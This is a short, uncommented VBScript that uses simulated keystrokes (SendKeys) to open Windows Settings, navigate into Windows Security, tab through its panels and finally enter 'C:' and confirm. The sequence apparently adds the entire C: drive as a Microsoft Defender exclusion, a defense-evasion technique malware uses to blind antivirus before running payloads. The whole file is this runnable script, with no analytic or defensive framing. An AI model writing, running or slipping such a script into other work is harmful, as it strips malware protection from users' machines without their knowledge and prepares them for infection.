Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.SendKeys "^{ESC} I"
WScript.Sleep 500
WshShell.SendKeys "Settings"
WScript.Sleep 100
WshShell.SendKeys "~"
WScript.Sleep 1000
WshShell.SendKeys "Windows Security"
WScript.Sleep 500

For x = 1 To 2
    WScript.Sleep 500
    WshShell.SendKeys "{DOWN}"
Next
For x = 1 To 2
    WScript.Sleep 500
    WshShell.SendKeys "~"
Next
For x = 1 To 4
    WScript.Sleep 500
    WshShell.SendKeys "{TAB}"
Next
WshShell.SendKeys "~"
For x = 1 To 6
    WScript.Sleep 500
    WshShell.SendKeys "{TAB}"
Next
WshShell.SendKeys "~"
WshShell.SendKeys "~"
WshShell.SendKeys "{DOWN}"
WshShell.SendKeys "~"
WshShell.SendKeys "C:"
WshShell.SendKeys "~"
WshShell.SendKeys "~"